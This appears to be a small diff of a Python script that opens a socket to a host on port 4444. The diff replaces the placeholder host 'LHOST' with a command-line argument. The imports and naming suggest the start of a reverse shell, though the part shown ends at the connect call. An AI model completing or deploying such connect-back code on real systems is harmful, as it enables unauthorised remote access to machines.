@@ -1,10 +1,11 @@
 import socket
 import os
 import subprocess
+import sys
 
 s = socket.socket()
 port = 4444
-host = 'LHOST'
+host = sys.argv[1]
 
 s.connect((host,port))
 
